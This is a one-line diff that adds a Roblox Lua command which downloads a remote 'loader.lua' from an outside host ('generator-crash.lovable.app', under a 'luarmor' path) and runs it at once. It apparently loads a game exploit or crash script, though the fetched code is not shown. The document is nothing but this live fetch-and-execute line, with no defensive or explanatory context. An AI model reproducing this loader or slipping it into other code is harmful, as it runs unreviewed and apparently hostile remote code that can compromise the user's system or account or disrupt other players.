@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://generator-crash.lovable.app/s/luarmor/loader.lua?p=luarmor"))()
